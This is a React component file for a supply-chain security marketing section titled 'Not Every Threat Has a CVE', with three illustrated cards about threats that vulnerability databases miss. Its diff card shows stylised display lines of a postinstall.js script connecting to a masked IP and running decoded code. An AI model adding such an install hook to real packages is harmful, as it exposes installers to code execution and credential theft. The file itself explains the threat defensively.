import { Container, Section } from "@/components/layout";
import { Reveal, RevealItem, RevealStagger } from "@/components/ui/Reveal";
import { INK, INK_MUTED, SIGNAL, VERDICT } from "./tricorder-palette";

/**
 * "Not Every Threat Has a CVE." — the three ways a vulnerability database
 * misses a threat, as three evidence cards. Each card opens on a small piece of
 * evidence drawn in code (a version timeline, a behaviour diff, a relationship
 * graph) so the three claims are shown, not just stated. Light section.
 */

type Evidence = "timeline" | "diff" | "graph";

interface GapCard {
  key: string;
  eyebrow: string;
  title: string;
  desc: string;
  evidence: Evidence;
  accent: string;
}

const CARDS: GapCard[] = [
  {
    key: "new",
    eyebrow: "Version",
    title: "New Doesn't Mean Safe",
    desc: "A new package version can be malicious before anyone has reported it.",
    evidence: "timeline",
    accent: SIGNAL.history,
  },
  {
    key: "known",
    eyebrow: "Behavior",
    title: "Known Doesn't Mean Safe",
    desc: "A dependency can pass a vulnerability scan while quietly changing what it does.",
    evidence: "diff",
    accent: SIGNAL.behavior,
  },
  {
    key: "isolated",
    eyebrow: "Relationships",
    title: "Safe Doesn't Mean Isolated",
    desc: "A package may look harmless alone, while its relationships reveal a larger campaign.",
    evidence: "graph",
    accent: SIGNAL.relationships,
  },
];

const MONO = "var(--font-mono), ui-monospace, Menlo, Consolas, monospace";

/** Version timeline: two settled releases, a fresh one published minutes ago with no record yet. */
function TimelineEvidence({ accent }: { accent: string }): React.ReactElement {
  return (
    <div className="relative h-full w-full">
      <svg viewBox="0 0 300 96" className="h-full w-full" preserveAspectRatio="xMidYMid meet" aria-hidden>
        <line x1="24" y1="48" x2="196" y2="48" stroke="#d9d9e6" strokeWidth="2" strokeLinecap="round" />
        <line x1="196" y1="48" x2="252" y2="48" stroke={VERDICT.malicious} strokeWidth="2" strokeLinecap="round" strokeDasharray="3 5" />
        {[
          { x: 40, label: "2.4.0", ok: true },
          { x: 118, label: "2.4.1", ok: true },
        ].map((v) => (
          <g key={v.label}>
            <circle cx={v.x} cy="48" r="7" fill="#fff" stroke={accent} strokeWidth="2" />
            <path d={`M${v.x - 3} 48l2.2 2.2 4-4.2`} stroke={accent} strokeWidth="1.6" fill="none" strokeLinecap="round" strokeLinejoin="round" />
            <text x={v.x} y="74" textAnchor="middle" style={{ fontFamily: MONO }} fontSize="11" fill="#6b6b80">
              {v.label}
            </text>
          </g>
        ))}
        <circle cx="252" cy="48" r="13" fill={VERDICT.malicious} opacity="0.14" />
        <circle cx="252" cy="48" r="7" fill="#fff" stroke={VERDICT.malicious} strokeWidth="2" />
        <circle cx="252" cy="48" r="2.4" fill={VERDICT.malicious} />
        <text x="252" y="74" textAnchor="middle" style={{ fontFamily: MONO }} fontSize="11" fontWeight="600" fill={INK}>
          2.5.0
        </text>
        <text x="292" y="24" textAnchor="end" style={{ fontFamily: MONO }} fontSize="10" fill={VERDICT.malicious}>
          published 12 min ago
        </text>
      </svg>
    </div>
  );
}

/** Behaviour diff: the scan says clean; the new build's install script says otherwise. */
function DiffEvidence({ accent }: { accent: string }): React.ReactElement {
  const line = (sign: "+" | "-" | " ", text: string, color: string, bg: string): React.ReactElement => (
    <div
      key={text}
      className="flex items-center gap-2 px-3"
      style={{ background: bg, color, fontFamily: MONO, fontSize: "var(--fs-badge)", lineHeight: 1.9 }}
    >
      <span className="w-2 shrink-0 select-none opacity-70">{sign}</span>
      <span className="truncate">{text}</span>
    </div>
  );
  return (
    <div className="flex h-full w-full items-center">
      <div
        className="w-full overflow-hidden"
        style={{ borderRadius: "10px", border: "1px solid #e6e6ef", background: "#fbfbfd" }}
      >
        <div
          className="flex items-center justify-between px-3"
          style={{ height: "26px", borderBottom: "1px solid #ececf3", fontFamily: MONO, fontSize: "var(--fs-badge)", color: "#6b6b80" }}
        >
          <span>postinstall.js</span>
          <span className="inline-flex items-center gap-1.5" style={{ color: accent }}>
            <span aria-hidden className="block h-[6px] w-[6px] rounded-full" style={{ background: accent }} />
            0 CVEs
          </span>
        </div>
        {line(" ", "const cfg = readConfig()", "#6b6b80", "transparent")}
        {line("-", "return normalize(cfg)", "#9a3b52", "rgba(244,63,94,0.06)")}
        {line("+", "net.connect(185.x.x.x:443)", "#0f6b5c", "rgba(45,212,191,0.14)")}
        {line("+", "exec(decode(cfg.token))", "#0f6b5c", "rgba(45,212,191,0.14)")}
      </div>
    </div>
  );
}

/** Relationship graph: three unremarkable packages sharing one maintainer and one host. */
function GraphEvidence({ accent }: { accent: string }): React.ReactElement {
  const nodes = [
    { x: 46, y: 26, label: "pkg-a" },
    { x: 46, y: 70, label: "pkg-b" },
    { x: 150, y: 48, label: "maintainer" },
    { x: 254, y: 26, label: "host" },
    { x: 254, y: 70, label: "pkg-c" },
  ] as const;
  const edges = [
    [0, 2],
    [1, 2],
    [2, 3],
    [2, 4],
    [4, 3],
  ] as const;
  return (
    <div className="relative h-full w-full">
      <svg viewBox="0 0 300 96" className="h-full w-full" preserveAspectRatio="xMidYMid meet" aria-hidden>
        {edges.map(([a, b]) => {
          const na = nodes[a];
          const nb = nodes[b];
          return (
            <line
              key={`${a}-${b}`}
              x1={na.x}
              y1={na.y}
              x2={nb.x}
              y2={nb.y}
              stroke={accent}
              strokeWidth="1.5"
              strokeOpacity="0.55"
            />
          );
        })}
        {nodes.map((n, i) => {
          const hub = i === 2 || i === 3;
          return (
            <g key={n.label}>
              {hub ? <circle cx={n.x} cy={n.y} r="14" fill={accent} opacity="0.14" /> : null}
              <circle cx={n.x} cy={n.y} r={hub ? 7 : 6} fill={hub ? accent : "#fff"} stroke={accent} strokeWidth="2" />
              <text
                x={n.x}
                y={n.y + (i === 2 ? 24 : i === 3 ? -14 : i === 4 ? 22 : i === 0 ? -12 : 22)}
                textAnchor="middle"
                style={{ fontFamily: MONO }}
                fontSize="10.5"
                fontWeight={hub ? 600 : 400}
                fill={hub ? INK : "#6b6b80"}
              >
                {n.label}
              </text>
            </g>
          );
        })}
      </svg>
    </div>
  );
}

function EvidenceFor({ kind, accent }: { kind: Evidence; accent: string }): React.ReactElement {
  switch (kind) {
    case "timeline":
      return <TimelineEvidence accent={accent} />;
    case "diff":
      return <DiffEvidence accent={accent} />;
    case "graph":
      return <GraphEvidence accent={accent} />;
  }
}

function GapCardView({ card }: { card: GapCard }): React.ReactElement {
  return (
    <article
      className="group flex h-full flex-col overflow-hidden bg-white transition-transform duration-300 hover:-translate-y-1"
      style={{
        borderRadius: "var(--radius-cs-card)",
        border: "1px solid #e8e8f0",
        boxShadow: "0 1px 2px rgba(17,24,39,0.04), 0 18px 40px -28px rgba(17,24,39,0.25)",
      }}
    >
      <div
        className="relative px-5 pt-5"
        style={{
          background: `linear-gradient(180deg, color-mix(in srgb, ${card.accent} 7%, #ffffff) 0%, #ffffff 100%)`,
        }}
      >
        <div className="relative w-full" style={{ height: "clamp(88px, 8vw, 104px)" }}>
          <EvidenceFor kind={card.evidence} accent={card.accent} />
        </div>
      </div>
      <div className="flex flex-1 flex-col px-6 pb-7 pt-4 sm:px-7">
        <p
          className="font-display"
          style={{
            fontSize: "var(--fs-badge)",
            fontWeight: 600,
            letterSpacing: "0.1em",
            textTransform: "uppercase",
            color: card.accent,
          }}
        >
          {card.eyebrow}
        </p>
        <h3
          className="mt-2 font-display"
          style={{ fontSize: "var(--fs-h4)", fontWeight: 600, letterSpacing: "-0.02em", lineHeight: 1.2, color: INK }}
        >
          {card.title}
        </h3>
        <p
          className="mt-2.5 font-sans"
          style={{ fontSize: "var(--fs-body)", lineHeight: 1.55, letterSpacing: "-0.01em", color: INK_MUTED }}
        >
          {card.desc}
        </p>
      </div>
    </article>
  );
}

export function TricorderThreatGap(): React.ReactElement {
  return (
    <Section
      padding="lg"
      className="overflow-hidden"
      style={{ background: "linear-gradient(180deg, #ffffff 0%, #f6f4fc 100%)" }}
    >
      {/* eslint-disable-next-line @next/next/no-img-element */}
      <img
        aria-hidden
        src="/images/deal-registration/ecosystems-corner-grid.svg"
        alt=""
        className="pointer-events-none absolute right-0 top-0 hidden select-none lg:block"
        style={{ width: "320px", height: "323px" }}
        loading="lazy"
        decoding="async"
      />
      <div
        aria-hidden
        className="pointer-events-none absolute select-none"
        style={{
          left: "calc(-40 / 1920 * 100%)",
          top: "-280px",
          width: "700px",
          height: "700px",
          background: "radial-gradient(50% 50% at 50% 50%, #9a51ff 0%, rgba(154,81,255,0) 100%)",
          opacity: 0.06,
        }}
      />
      <Container className="relative">
        <Reveal header>
          <div className="mx-auto max-w-[760px] text-center">
            <h2
              className="font-display"
              style={{ fontSize: "var(--fs-h2)", fontWeight: 700, letterSpacing: "-0.03em", lineHeight: 1.08, color: INK }}
            >
              Not Every Threat Has a{" "}
              <span
                className="bg-clip-text text-transparent"
                style={{ backgroundImage: "linear-gradient(102deg, #9a51ff 0%, #2cc1eb 100%)" }}
              >
                CVE.
              </span>
            </h2>
            <p
              className="mx-auto mt-6 max-w-[640px] font-sans"
              style={{ fontSize: "var(--fs-lead)", fontWeight: 400, letterSpacing: "-0.02em", lineHeight: 1.5, textWrap: "balance", color: INK_MUTED }}
            >
              The software supply chain changes faster than vulnerability
              databases can document it.
            </p>
          </div>
        </Reveal>

        <RevealStagger className="mx-auto mt-12 grid max-w-[1160px] grid-cols-1 gap-5 md:grid-cols-3 lg:mt-16 lg:gap-6">
          {CARDS.map((card) => (
            <RevealItem key={card.key} className="h-full">
              <GapCardView card={card} />
            </RevealItem>
          ))}
        </RevealStagger>
      </Container>
    </Section>
  );
}
